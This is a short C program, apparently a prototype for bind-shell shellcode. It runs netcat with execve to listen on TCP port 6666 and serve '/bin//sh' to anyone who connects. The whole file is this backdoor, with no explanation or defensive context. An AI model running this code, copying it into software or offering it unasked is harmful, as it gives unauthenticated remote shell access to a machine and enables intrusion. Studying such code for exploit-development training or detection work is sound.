#include <stdio.h>
#include <unistd.h>

int main()
{
  char *test[1] = {NULL};

  char *arguments[7]= { "/usr/bin/nc",
                        "-lnp",
                        "6666",
                        "-tte",
                        "/bin//sh",
                        NULL
                       };
  execve("/usr/bin/nc", arguments, test);
}
